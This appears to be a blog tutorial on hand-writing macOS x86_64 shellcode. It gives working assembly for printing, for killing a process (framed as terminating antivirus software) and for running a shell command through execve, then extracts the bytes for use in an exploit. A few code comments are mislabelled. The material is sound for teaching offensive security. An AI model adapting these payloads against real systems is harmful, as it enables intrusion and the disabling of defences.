---
title: "macOS: Shellcoding on Apples (x86_64)"
classes: wide
header:
  teaser: /assets/images/image.psd.png

ribbon: blue
description: "macOS Shellcoding in depth on x86_64."
categories:
  - MacOS
tags:
  - MacOS
toc: true
---

# Introduction

This guide explores shellcoding on the `x86_64` architecture for `macOS`, bypassing the traditional x86 starting point for a practical reason: with the release of macOS 10.15 (`Catalina`), Apple discontinued support for `32-bit` applications entirely. Since `x86_64` maintains backward compatibility with x86 code anyway, focusing on `64-bit` shellcoding makes the most sense for modern `macOS` systems. Before diving in, you'll need at least a basic understanding of assembly language—this isn't an assembly tutorial, so if you're unfamiliar with the fundamentals, take some time to learn them first and return when you're ready for the challenge. Rather than immediately jumping into cryptic assembly instructions, this guide follows a practical workflow: start by writing code in `C`, identify the necessary system calls, and then translate everything into assembly. This approach leverages the wealth of existing `C` documentation and resources, making the process significantly more manageable. You'll find countless examples of how to build network clients, manipulate processes, or execute commands in `C`, but you'd be hard-pressed to find someone talking about implementing these same tasks purely in assembly. Let's start with our Blogpost.

> You can find all the code on my github: [https://github.com/Zeyad-Azima/macOShellcoding](https://github.com/Zeyad-Azima/macOShellcoding)

# Lab Setup

Let's Setup our Lab and the required tools, Let's list all the other tools we need. 

- Homebrew

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

- Xcode: 

```
We can download it from `AppStore`.
or: https://xcodereleases.com
```

- Xcode Command Line Tools (CLT)

```sh
xcode-select --install
```

- Nasm

```sh
brew install nasm
```

- Binutils (`ld`)

```sh
brew install binutils
```

Before we go on straight to shellcoding, We need to understand some FUNDAMENTALS first we would be using to be able to write shellcodes. As we know the macos kernel (`XNU`) is a hybrid kernel which contains also `BSD`. We need to download the `XNU` source code. Cause we will use it for references in creating ours shellcodes and understanding `syscalls` on `macOS`. We can download it from [here](https://opensource.apple.com/releases/).

Now, We need to download the source code version that matches the macOS you writing the shellcode for. I am on `macOS Sequoia` and the version is `macOS 15.5`. You can use `sw_vers` command to check it.

```sh
~ % sw_vers
ProductName:		macOS
ProductVersion:		15.5
BuildVersion:		24F74
```

Now, Let's download the `XNU` VERSION FOR it.

<img width="1130" height="575" alt="image" src="https://github.com/user-attachments/assets/7b194e38-5dbc-4f67-bd69-fa5b4510f214" />

When we scroll down more we can find it.



<img width="935" height="195" alt="image" src="https://github.com/user-attachments/assets/b7798f9c-1077-4967-927d-0132ad2d3048" />

That's the version (`xnu-11417.121.6`) of `macOS 15.5`.

# XNU Syscall Classes
Now, Let's open it with `VSCode` or your favorite `IDE/CodeEditor`.

<img width="339" height="714" alt="image" src="https://github.com/user-attachments/assets/4fb70323-3964-4270-9897-dcaf9c9aa4e9" />

All these files and folders for kernel we will use just some of it to understand the basics, But while we writing our shellcodes we would be navigating a lot through different files and folders. First Let's go to `osfmk/mach/i386/syscall_sw.h`.

<img width="1225" height="469" alt="image" src="https://github.com/user-attachments/assets/8766a5a2-ee46-4cc5-ad02-dbe9311b9fa1" />

starting on line `135` till `152`, That's what matters of us. In here as we know and mentioned before that `XNU` is hybrid, So if you want to make execute a syscall for related to `BSD` you would need to define the entry to it.

```C
#define SYSCALL_CLASS_SHIFT	24
#define SYSCALL_CLASS_MASK	(0xFF << SYSCALL_CLASS_SHIFT)
#define SYSCALL_NUMBER_MASK	(~SYSCALL_CLASS_MASK)
......
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */	
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```

In `XNU` (the kernel underlying `macOS`, `iOS`, etc.), system calls are not uniformly accessed via a single syscall table like in `Linux`. Instead, `XNU` uses syscall classes to route calls through different subsystems. Each system call class is associated with a unique number, which is shifted left by 24 bits (defined by `SYSCALL_CLASS_SHIFT`) to determine its class. So for every class to get the entry it will be as the following:

| Class | Name                  | Value | Shifted Base (`<< 24`) |               |
|-------|-----------------------|-------|------------------------|----------------------|
| 0     | `SYSCALL_CLASS_NONE`  | 0     | `0x00000000`           | Invalid              |
| 1     | `SYSCALL_CLASS_MACH`  | 1     | `0x01000000`           | Mach traps           |
| 2     | `SYSCALL_CLASS_UNIX`  | 2     | `0x02000000`           | **BSD syscalls**     |
| 3     | `SYSCALL_CLASS_MDEP`  | 3     | `0x03000000`           | Machine-dependent    |
| 4     | `SYSCALL_CLASS_DIAG`  | 4     | `0x04000000`           | Diagnostics          |
| 5     | `SYSCALL_CLASS_IPC`   | 5     | `0x05000000`           | Mach IPC (newer)     |

> BSD = 0x02 << 24 = 0x02000000 → 0x2000000

The `SYSCALL_CLASS_MASK` and `SYSCALL_NUMBER_MASK` are used to extract the class and syscall number respectively. For example, a traditional `BSD` system call such as `execve` (system call number `59` or `0x3b` in hex) in the `SYSCALL_CLASS_UNIX` (number `2`) would be represented as `0x200003b` when passed to the syscall assembly instruction.

```asm
; Assembly example to make a syscall with execve (BSD) in macOS
mov rax, 0x200003b  ; Load the syscall number for execve (59 with class mask)
mov rdi, address    ; Address of the command to execute
mov rsi, argv       ; Pointer to an array of arguments
mov rdx, envp       ; Pointer to an array of environment variables
syscall             ; Make the system call
```

To make it clear, You're dining in the `XNU` restaurant, a multi-level establishment where each floor represents a different system call class, and the kitchen routes your order based on a cleverly encoded ticket. The first floor, `SYSCALL_CLASS_MACH` (class 1), serves hearty main courses like task and thread operations, while the second floor, `SYSCALL_CLASS_UNIX` (class 2), specializes in classic `BSD` desserts such as `execve` and `write`. To order a medium-rare steak — item number `0x3B` (59) on the Mach floor — you must tell the waiter `0x0100003B`, calculated as `(1 << 24) | 0x3B`. Craving tiramisu (`execve`, also #59) from the `BSD` floor? Your order becomes `0x0200003B` — same dish number, different floor, computed as `(2 << 24) | 0x3B`. Just like in `XNU`, never shout just “59” — the kitchen needs the full encoded number with the class shifted 24 bits left, ensuring your steak doesn’t arrive as a dessert (and vice versa). Bon appétit in the kernel!

# x86_64 Calling Conventions and Registers

In the **x86-64 System** used by macOS, function arguments are passed via registers in this order: `RDI` holds the 1st argument, `RSI` the 2nd, `RDX` the 3rd (and sometimes the 2nd return value), `RCX` the 4th, `R8` the 5th, and `R9` the 6th. The return value (or syscall number) is placed in `RAX`, while `RIP` points to the next instruction, `RSP` manages the stack (and must be **16-byte aligned** before any function call), `RBP` serves as the frame pointer for stack frames, and `RBX` acts as a general-purpose base register often preserved across calls. If a function requires more than six arguments, additional arguments are passed on the stack. It is essential to ensure that the `RSP` is properly aligned before making a function call. Despite system calls often working without strict alignment, adhering to this requirement is a good practice to avoid unexpected behavior. To illustrate how these registers are used in a function call, consider a function `foo` that takes three arguments.

```asm
; Assume arg1, arg2, and arg3 are already set with appropriate values
mov rax, syscall_number
mov rdi, arg1 ; 1st argument
mov rsi, arg2 ; 2nd argument
mov rdx, arg3 ; 3rd argument
syscall      ; Execute syscall
```

## Calling Conventions Table

You can use this table as a reference.

| Register | Usage |
|----------|-------|
| `RDI` | 1st function argument |
| `RSI` | 2nd function argument |
| `RDX` | 3rd function argument (and optionally the 2nd return value) |
| `RCX` | 4th function argument |
| `R8`  | 5th function argument |
| `R9`  | 6th function argument |
| `RAX` | Function return value/Syscall Number |
| `RIP` | Instruction pointer |
| `RSP` | Stack pointer (must be 16-byte aligned before calls) |
| `RBP` | Frame pointer |
| `RBX` | Base pointer (optional use) |

# Shellcoding

Before writing our shellcode, To make it easy for ourselves instead of getting lost in all the assembly instructions, The best workflow to do is to write your code in `C`, then we convert it to assembly which will make it very easy for us, As there are references and resources for `C` it will make our process easier. For example, You would find people talking about how to make a client/server in `C` using `socket`. But, you won't find someone("insane") talking about how to make a client/server in assembly. So The process would be as the following:
- Find `C` functions that we will need in our code.
- Write our code in `C`.
- Turn our code into assembly.
	- Which including getting our syscall numbers ready.
	- Function arguments and types. 

Let's go ahead and start with something simple to make things clear.

## Print 'Hello'

We will start by printing `Hello` into the screen. So let's apply our workflow. Usually when we want to print something in `C`, we use `printf()` function as the following:

```C
#include <stdio.h>

int main() {
    printf("Hello");
    return 0;
}
```

Now, As we identified the functions we need which is `printf()`, And we wrote our code the 3rd step is to turn it into assembly. So the first thing we would need is to get the syscall number for `printf()`, We can find all the `syscalls` can be found in `bsd/kern/syscalls.master`.  


<img width="607" height="57" alt="image" src="https://github.com/user-attachments/assets/66156c40-4402-4dc9-a8b7-b4545641de5f" />

But, the thing is we won't find `printf()` in the file. Let's investigate the `printf()` function source code. After investigation, the implementation of `printf()` involves calling other functions till we reach `write` syscall.

### Call Chain: `printf` → `write` Syscall

| Step | Function Name |
|------|---------------|
| 1 | `printf` |
| 2 | `vfprintf` |
| 3 | `__vfprintf_internal` |
| 4 | `Xprintf_buffer_write` |
| 5 | `_IO_new_file_overflow` |
| 6 | `_IO_do_write` |
| 7 | `new_do_write` |
| 8 | `_IO_SYSWRITE` |
| 9 | `__swrite` *(macOS only)* |
| 10 | `write` *(syscall)* |


You can find the source code files here:
- [printf.c](https://codebrowser.dev/glibc/glibc/stdio-common/printf.c.html)
- [vfprintf.c](https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf.c.html)
- [vfprintf-internal.c](https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf-internal.c.html)
- [printf_buffer.h](https://codebrowser.dev/glibc/glibc/stdio-common/printf_buffer.h.html)
- [fileops.c](https://codebrowser.dev/glibc/glibc/libio/fileops.c.html)
- [libioP.h](https://codebrowser.dev/glibc/glibc/libio/libioP.h.html)

Also you could just have asked `ChatGPT` or something xD, But keep in mind with complicated shellcodes you would want to go through codes and else cause you always will learn something and upgrade yourself.

Now, When we search for `write` syscall we can see it in the `syscalls.master` file:


<img width="1106" height="158" alt="image" src="https://github.com/user-attachments/assets/9aab6429-2fa8-454d-a3e4-aa023b96b10d" />

As we see the `write` syscall number is `4`. And `write` takes 3 arguments. We need to learn about these argument and how to use it, Which simple can be done by searching it or go to the documentation:


<img width="1078" height="117" alt="image" src="https://github.com/user-attachments/assets/f8bd5305-0d23-4b50-a837-df58881c10b1" />

So from the description we can know that we need to supply the string pointer to `buf` the second argument and number of bytes (`length`) to the third argument `nbyte`, And for fields/fd or File Descriptor, When we search it we will see that it takes the following values
- `0 (STDIN_FILENO)`: Represents standard input, typically connected to the keyboard or the input of a pipe.
- `1 (STDOUT_FILENO)`: Represents standard output, typically connected to the display or the output of a pipe.
- `2 (STDERR_FILENO)`: Represents standard error, typically connected to the display for error messages.

Our goal here is `STDOUT` which is value `1`. So our syscall will be as the following:

```c
int main() {
    const char *message = "Hello";
    write(1, message, 5);
}
```

Let's start with writing our shellcode:

```asm
bits 64

global _main

_main:
	mov rdi, 1 ; stdout for fd argument
	mov rcx, 'Hello' ; put our string value into RCX
	push rcx ; We push our string to the stack
	mov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument
	mov rdx, 5 ; nbytes argument (our string length)
	mov rax, 0x2000004 ; The BSD syscall class entry + syscall number
	syscall ; invoke/execute syscall
```

Here our shellcode, starting with `bits 64` to enforce x86-64 mode and `global _main` to export the Mach-O entry point. The first instruction `mov rdi, 1` loads the file descriptor `1` (stdout) into `RDI`, the first argument register as we mentioned before. Next, `mov rcx, 'Hello'` encodes the 5-character string as a 64-bit immediate `0x6f6c6c6548` (little-endian: `'o','l','l','e','H'`) into `RCX`. The `push rcx` then writes these 8 bytes to the stack, placing `'H'` at the new stack pointer and padding the remaining 3 bytes with zeros `0x00` to align the stack, Then `mov rsi, rsp` copies the current stack pointer into `RSI`, Which is the second argument, so it now points directly to the first character `'H'`, forming a valid `char *buf`. The `mov rdx, 5` sets the third argument, which is the number of bytes to write and exactly matching the length of `Hello`. Finally, `mov rax, 0x2000004` loads the `XNU` encoded syscall number: `(SYSCALL_CLASS_UNIX << 24) | 4`, where class `2` routes to the BSD subsystem and `4` selects the `write` entry from `bsd/kern/syscalls.master`. The `syscall` instruction triggers the kernel trap, dispatching through `XNU`’s unified handler to execute `write(1, "Hello", 5)`, printing `Hello` to the terminal.

Let's save our code into file `hello.asm` and compile our code.

- First we will turn the code to object file for `macho64` architecture using `nasm`:
```sh
shellcoding % nasm -f macho64 hello.asm
shellcoding % ls
hello.asm	hello.o
```

As we see we got our object file `hello.o`.

- Second, We will link the required libraries needed for the code to generate the executable using `ld`
```sh
shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macos 15.5 15.5
ld: warning: no platform load command found in 'hello.o', assuming: macOS
shellcoding % ls
hello		hello.asm	hello.o
```

Here we can see after linking we got our executable.

> Note: The `-L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib` sets the **library search path** to the macOS 15.5 SDK’s `usr/lib` directory, ensuring the linker locates the correct version of `libSystem.tbd` — Apple’s modern stub library format that resolves to `libSystem.dylib` at runtime. The `-lSystem` flag explicitly links against **libSystem**, the foundational system library that exports the `syscall` interface, `write`, `exit`, and all BSD/POSIX functions; without it, the `syscall` instruction in our shellcode would remain unresolved, causing a linker error. Finally, `-platform_version macos 15.5 15.5` declares the **minimum deployment target** as macOS 15.5 (Sequoia), embedding the `LC_VERSION_MIN_MACOSX` load command and forcing the use of Sequoia-compatible API stubs and system call encodings — essential for forward and backward compatibility on modern Apple silicon and Intel systems.

- Let's run and test our executable:
```sh
shellcoding % ./hello 
Hellozsh: segmentation fault  ./hello
```

We see that our execution results in `segmentation fault`, And the reason for that the program doesn't `return` or in simple words exit. For example, Within the main function in `C`, When return is used in the main function (e.g., `return 0;`), it typically translates to an `exit_group` system call (`exit`). This system call terminates the entire process and returns the specified exit status to the operating system. So, We need to exit after executing our `write` syscall.

## Exit

We can exit using `exit` syscall, as we can see it in the `syscalls.master` file:
```c
1	AUE_EXIT	ALL	{ void exit(int rval) NO_SYSCALL_STUB; }
```

The syscall number is `1` and it takes only 1 integer argument `rval` which is the value to return. When we go to documentation the `rval` value can be `0` for `EXIT_SUCCESS` (successful execution of a program) or `EXIT_FAILURE` (unsuccessful execution of a program). Let's update our shellcode and add `exit` syscall

```asm
bits 64

global _main

_main:
	mov rdi, 1 ; stdout for fd argument
	mov rcx, 'Hello' ; put our string value into RCX
	push rcx ; We push our string to the stack
	mov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument
	mov rdx, 5 ; nbytes argument (our string length)
	mov rax, 0x2000004 ; The BSD syscall class entry + write syscall number
	syscall ; invoke/execute syscall
	
	mov rax, 0x2000001 ; The BSD syscall class entry + exit syscall
	mov rdi, 0 ; arg int rval
	syscall ; invoke/execute syscall
```

Now, let's repeat the process of compiling to get our executable again and test it.

```sh
shellcoding % nasm -f macho64 hello.asm
shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5
ld: warning: no platform load command found in '/Users/zeyadazima.com/shellcoding/hello.o', assuming: macOS
shellcoding % ./hello 
Hello%                                                           
shellcoding % 
```

As we see clearly our code worked perfectly. 

## Kill a Process

Let's do another shellcode, And take a scenario in case we found a way to execute a code with high privileges and We need to write a shellcode to kill the `AV` process.

The `C` code to kill a process is as the following:

```C
#include <stdio.h>
#include <signal.h>
#include <sys/types.h> // For pid_t
#include <unistd.h>    // For getpid() (optional, for self-killing example)

int main() {
    pid_t target_pid;

    target_pid = 12345; 

    // Sending SIGTERM (graceful termination)
    kill(target_pid, SIGTERM);

    return 0;
}
```

We can see here we used `kill` function and supply the `PID` and the signal which is `SIGTERM`.

Now, If we search for `kill` in `syscalls.master`. We can find it:

```C
37	AUE_KILL	ALL	{ int kill(int pid, int signum, int posix) NO_SYSCALL_STUB; }
```

For the `PID` we will create a test process and get it's `PID` to supply it for the first argument and for the `signum` argument, In the `C` code the value is `SIGTERM` which it will be a pre-defined value in the source code, We can search for `#define SIGTERM` in the `XNU` source code, We will find it at `xnu-xnu-11417.121.6/bsd/sys/signal.h:103`:

```C
#define SIGKILL 9       /* kill (cannot be caught or ignored) */
#define SIGBUS  10      /* bus error */
#define SIGSEGV 11      /* segmentation violation */
#define SIGSYS  12      /* bad argument to system call */
#define SIGPIPE 13      /* write on a pipe with no one to read it */
#define SIGALRM 14      /* alarm clock */
#define SIGTERM 15      /* software termination signal from kill */
#define SIGURG  16      /* urgent condition on IO channel */
#define SIGSTOP 17      /* sendable stop signal not from tty */
```

So we can see that `SIGTERM` value is `15`, But the better option to use `SIGKILL` with value `9` as it will be forced and kill (cannot be caught or ignored). We will supply `9` as the second argument. Now, In the `C` code it doesn't have a 3rd argument as we see for the `syscall`. If we search for `int posix` in the `XNU` source code, We gonna find the following code under `xnu-xnu-11417.121.6/bsd/kern/kern_sig.c:1373`:

```C
int
kill(proc_t cp, struct kill_args *uap, __unused int32_t *retval)
{
	proc_t p;
	kauth_cred_t uc = kauth_cred_get();
	int posix = uap->posix;         /* !0 if posix behaviour desired */

	AUDIT_ARG(pid, uap->pid);
	AUDIT_ARG(signum, uap->signum);

	if ((u_int)uap->signum >= NSIG) {
		return EINVAL;
	}
```

We can see from apple comment on the source code that, if we want `POSIX` behaviour in killing the process we have to supply anything other than `0`. And after more searching and asking diff `AI` chatbots i got the following:

| Value               | Meaning                     |
|---------------------|-----------------------------|
| `posix = 0`         | Mach (legacy) signal behavior |
| `posix = 1` (or any `!0`) | POSIX/BSD signal behavior |

> Note: usually when you see extra arguments that was not mentioned or supplyed in the `C` code, It means that the argument is optional and not really required so you always can supply `0` or `NULL` as a value to the optional/non-required arguments.
Let's run our test process using a simple infinity loop running in background:

```sh
shellcoding % while true; do sleep 10; done &
[2] 27646
shellcoding % ps -p 27646
  PID TTY           TIME CMD
27646 ttys061    0:00.01 -zsh
```
the `PID` is `27646`

Now, Lets write our shellcode:

```asm
bits 64

global _main

_main:
	mov rdi, 27646 ; 1st argument PID
	mov rsi, 9 ; 2nd argument signum
	mov rdx, 0 ; 3rd argument posix
	mov rax, 0x2000025 ; The BSD syscall class entry + 0x25 (which is 37 in hex) kill syscall
	syscall
	
	mov rax, 0x2000001 ; The BSD syscall class entry + exit syscall
	mov rdi, 0 ; arg int rval
	syscall ; invoke/execute syscall
```

It's already clear here, We passed our arguments as the following; `PID` for `RDI`, then `signum` for `RSI` and After that, `posix` to `RDX` and setup our `syscall`. Finally, We exit gracefully using `exit` syscall.

```sh
shellcoding % nasm -f macho64 killer.asm                                                                                                       
shellcoding % ld -o killer killer.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5
ld: warning: no platform load command found in '/Users/zeyadazima.com/shellcoding/killer.o', assuming: macOS
shellcoding % ./killer 
shellcoding % 
[2]  - killed     while true; do; sleep 10; done
shellcoding % ps -p 27646
  PID TTY           TIME CMD
```

As we can see clearly, The process has been killed successfully.

## Execute Command
Now, The exciting parts where we need to execute commands. Let's bring our `C` code to execute commands on the system. Which is usually in `C` it's done through `system()` function. But remember that on the `XNU` has `BSD`. So Let's search for `C` code where execute commands using `BSD` functions.

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int main() {
    pid_t pid;
    char *const argv[] = {"/bin/ls", "-l", NULL}; // Command and its arguments
    char *const envp[] = {NULL}; // Environment variables (can be customized)

    execve(argv[0], argv, envp);
   

    return 0;
}
```

As we can see here it uses `execv()` function and it takes 3 arguments. lET'S SEARCH FOR it in the `syscalls.master`:

```C
59	AUE_EXECVE	ALL	{ int execve(char *fname, char **argp, char **envp) NO_SYSCALL_STUB; }
```

So it takes a pointer to the `fname` which is the file name, then pointer to array `argp` and pointer to another array `envp`.

<img width="717" height="271" alt="image" src="https://github.com/user-attachments/assets/d03ca643-261d-4918-b1d0-271519f8471e" />

We can see that in the description of `execve()`, the first argument is the path to the binary we want to execute which is gonna be the shell in this case `/bin/zsh`. Then for the second argument it takes array the arguments of the executable or program we passing and the first element in the array has to be the same file name `/bin/zsh`, So the array will be as the following, if we want to execute`echo "W00tW00t" > /tmp/Pwned.txt`  command `{"/bin/zsh","-c","echo 'W00tW00t' > /tmp/Pwned.txt"}`. The third argument as mentioned is optional so we can supply a pointer to `NULL` array.

Let's go on and write our shellcode:

```asm
bits 64

global _main

_main:

	mov rcx, 0 	; NULL Terminator
	push rcx 	; push the NULL Terminator to the stack
	mov rdx, '/bin/zsh' 	;  our file/executable name
	push rdx 	; push the file/executable name to the stack
	mov rdi, rsp 	; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name
	mov rbx, '-c' 	; argp[1] => the 2nd element in the arguments array
	push rbx 	; push argp[1] to the stack
	mov rbx, rsp 	; save the argp[1]('-c') pointer to RBX
	push rcx 	; push the NULL Terminator to the stack
```

Let's stop here for a while, We need to place our 3rd element which is our command `echo "W00tW00t" > /tmp/Pwned.txt`, Which is for a string to long and to divide it to push it on the stack will not be the best thing our shellcode will be so long. Instead we gonna use a trick to place it on the stack for example:

```asm
 call array
 db 'echo "W00tW00t" > /tmp/Pwned.txt', 0
```

`call` pushes the address of the following `db` string onto the stack. Which will make it easier for us.

```asm
bits 64

global _main

_main:

	xor rcx, rcx 	; NULL Terminator
	push rcx 	; push the NULL Terminator to the stack
	mov rdx, '/bin/zsh' 	;  our file/executable name
	push rdx 	; push the file/executable name to the stack
	mov rdi, rsp 	; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name
	mov rbx, '-c' 	; argp[1] => the 2nd element in the arguments array
	push rbx 	; push argp[1] to the stack
	mov rbx, rsp 	; save the argp[1]('-c') pointer to RBX
	push rcx 	; push the NULL Terminator to the stack

; classic position-independent trick
	call array ; call the array label to setup the array for argp
	db 'echo "W00tW00t" > /tmp/Pwned.txt', 0 ; arg[2] which is our command and including the NULL Terminator
```

Now, We need to make `array` label where it will setup the array elements and execute the `execve` syscall and then exit.

```asm
bits 64

global _main

_main:

	xor rcx, rcx 	; NULL Terminator
	push rcx 	; push the NULL Terminator to the stack
	mov rdx, '/bin/zsh' 	;  our file/executable name
	push rdx 	; push the file/executable name to the stack
	mov rdi, rsp 	; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name
	mov rbx, '-c' 	; argp[1] => the 2nd element in the arguments array
	push rbx 	; push argp[1] to the stack
	mov rbx, rsp 	; save the argp[1]('-c') pointer to RBX
	push rcx 	; push the NULL Terminator to the stack
	call array ; call the array label to setup the array for argp
	db 'echo "W00tW00t" > /tmp/Pwned.txt', 0 ; arg[2] which is our command and including the NULL Terminator
	
array:
	push rbx ; arg[1] put the -c pointer into the array
	push rdi ; args[0] which is fname saved before
	mov rsi, rsp ; pass the array pointer for RSI which holds the second argument
	xor rdx, rdx ; empty rdx to use as NULL for the third argument envp
	mov rax, 0x200003B ; The BSD syscall class entry + 0x3B (which is 59 in hex) kill syscall
	syscall ; invoke/execute syscall
	
	mov rax, 0x2000001 ; The BSD syscall class entry + exit syscall
	mov rdi, 0 ; arg int rval
	syscall ; invoke/execute syscall
```

Here our shellcode, first zeroes `RCX` with `xor rcx, rcx` and `push rcx` to place an 8-byte `NULL` on the stack which will be reused as padding and as a `NULL` terminator. Next `mov rdx, '/bin/zsh'` loads the bytes for the `filename` into `RDX` and `push rdx` writes those 8 bytes to the stack so that `RSP` now points at the `"/bin/zsh"` string. `mov rdi, rsp` copies that stack pointer into `RDI`, which is the first argument to `execve` (the `filename` pointer).After that load `'-c'` into `RBX` and `push rbx`, creating the `"-c"` string on the stack; `mov rbx, rsp` saves the pointer to the `"-c"` string in `RBX` for later. Another `push rcx` places a `NULL` on the stack. The `call array` instruction is the classic position-independent trick, it pushes the address of the immediately following `db` bytes (the command string) onto the stack and then jumps to the `array` label, so the command string’s runtime address is already on the stack when `array` executes. The `db 'echo "W00tW00t" > /tmp/Pwned.txt', 0` provides the NUL-terminated command that `zsh -c` will execute. Then, At `array`  label we will build the `argp` array by `push rbx` (push pointer to `"-c"`) and `push rdi` (push pointer to `"/bin/zsh"`), then `mov rsi, rsp` sets `RSI` to point at that array so `execve` receives `argp` correctly. Following `xor rdx, rdx` sets `RDX = 0` so `envp` is `NULL`. `mov rax, 0x200003B` loads the `BSD` syscall number for `execve`.

> Note: `0x3B` = 59 decimal → `execve`

And `syscall` invokes the kernel to execute `execve(filename, argv, envp)`. If `execve` returns (i.e., it failed) the code falls through to `mov rax, 0x2000001` / `mov rdi, 0` / `syscall` which calls the `exit` syscall to terminate the process.

```sh
shellcoding % nasm -f macho64 execute.asm                                                                                                          
shellcoding % ld -o execute execute.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5
ld: warning: no platform load command found in '/Users/zeyadazima.com/shellcoding/execute.o', assuming: macOS
shellcoding % ls /tmp
node-compile-cache OSL_PIPE_501_SingleOfficeIPC	powerlog
shellcoding % ./execute                                                                                                                            
shellcoding % ls /tmp  
node-compile-cache OSL_PIPE_501_SingleOfficeIPC	powerlog Pwned.txt
/tmp % cat Pwned.txt 
W00tW00t
```

We can see clearly, That our shellcode is executed successfully and our file created.

# Extract Shellcode

Now, Let's extract our shellcode from the object file, So if we need to send it with our exploit. We will use `objdump` tool and will show also how to do it with `otool`.

## objdump

```sh
shellcoding% objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o

execute.o:	file format mach-o 64-bit x86-64

Disassembly of section __TEXT,__text:

0000000000000000 <_main>:
       0: 48 31 c9                     	xor	rcx, rcx
       3: 51                           	push	rcx
       4: 48 ba 2f 62 69 6e 2f 7a 73 68	movabs	rdx, 0x68737a2f6e69622f
       e: 52                           	push	rdx
       f: 48 89 e7                     	mov	rdi, rsp
      12: bb 2d 63 00 00               	mov	ebx, 0x632d
      17: 53                           	push	rbx
      18: 48 89 e3                     	mov	rbx, rsp
      1b: 51                           	push	rcx
      1c: e8 21 00 00 00               	call	0x42 <array>
      21: 65 63 68 6f                  	movsxd	ebp, dword ptr gs:[rax + 0x6f]
      25: 20 22                        	and	byte ptr [rdx], ah
      27: 57                           	push	rdi
      28: 30 30                        	xor	byte ptr [rax], dh
      2a: 74 57                        	je	0x83 <array+0x41>
      2c: 30 30                        	xor	byte ptr [rax], dh
      2e: 74 22                        	je	0x52 <array+0x10>
      30: 20 3e                        	and	byte ptr [rsi], bh
      32: 20 2f                        	and	byte ptr [rdi], ch
      34: 74 6d                        	je	0xa3 <array+0x61>
      36: 70 2f                        	jo	0x67 <array+0x25>
      38: 50                           	push	rax
      39: 77 6e                        	ja	0xa9 <array+0x67>
      3b: 65 64 2e 74 78               	je	0xb8 <array+0x76>
      40: 74 00                        	je	0x42 <array>

0000000000000042 <array>:
      42: 53                           	push	rbx
      43: 57                           	push	rdi
      44: 48 89 e6                     	mov	rsi, rsp
      47: 48 31 d2                     	xor	rdx, rdx
      4a: b8 3b 00 00 02               	mov	eax, 0x200003b
      4f: 0f 05                        	syscall
      51: b8 01 00 00 02               	mov	eax, 0x2000001
      56: bf 00 00 00 00               	mov	edi, 0x0
      5b: 0f 05                        	syscall

```

- Here we can see our dissassembled code clearly and the array, etc. We need to save this into file

```sh
objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o > execute.disasm
```

 - Now, Let's extract the hex bytes from the `execute.disasm` file. Using command line utilities.

```sh
shellcoding% grep -E '^[[:space:]]+[0-9a-f]+:' execute.disasm \
  | awk '{for(i=2;i<=NF;i++) if ($i ~ /^[0-9a-f]{2}$/) printf "%s", $i}' \
  | tr -d '\n' > shellcode.hex
shellcoding% cat shellcode.hex 
4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05
```

- Convert it to binary

```sh
shellcoding% xxd -r -p shellcode.hex > shellcode.bin
```

- Let's Check the Shellcode size

```sh
shellcoding% wc -c shellcode.bin
      93 shellcode.bin // 93 bytes
```

- Generate `C` array of bytes for the shellcode

```sh
shellcoding% xxd -i shellcode.bin > shellcode.h
shellcoding% cat shellcode.h
unsigned char shellcode_bin[] = {
  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,
  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,
  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,
  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,
  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,
  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,
  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,
  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05
};
unsigned int shellcode_bin_len = 93;
```

## otool

- Extract Raw Section Bytes

```sh
shellcoding% otool -s __TEXT __text ~/shellcoding/execute.o \
  | sed -n '3,$p' \
  | awk '{ for(i=2;i<=NF;i++) printf "%s",$i } END{ print "" }' > shellcode_otool.hex
shellcoding% cat shellcode_otool.hex 
4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05
```

- Convert to binary `xxd`

